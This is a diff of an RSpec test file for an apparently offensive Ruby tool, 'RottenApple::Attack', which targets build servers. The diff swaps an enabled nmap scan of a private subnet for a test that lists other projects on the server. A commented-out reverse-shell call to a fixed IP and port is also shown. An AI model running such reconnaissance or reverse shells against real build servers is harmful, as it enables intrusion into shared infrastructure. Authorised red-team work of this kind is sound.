@@ -14,13 +14,13 @@ describe RottenApple::Attack do
     # subject.reverse_shell('10.225.71.7', 1337)
     #end
 
-    it "should perform an NMAP scan" do
-      subject.command('nmap -p 80,443 --open -Pn -P0 -n -T4 10.255.71.0/24')
-    end
-
-    #it "should list the other projects built on this server" do
-    #  subject.command('ls ../../')
+    #it "should perform an NMAP scan" do
+    #  subject.command('nmap -p 80,443 --open -Pn -P0 -n -T4 10.255.71.0/24')
     #end
+
+    it "should list the other projects built on this server" do
+      subject.command('ls ../../')
+    end
   end
 
 end
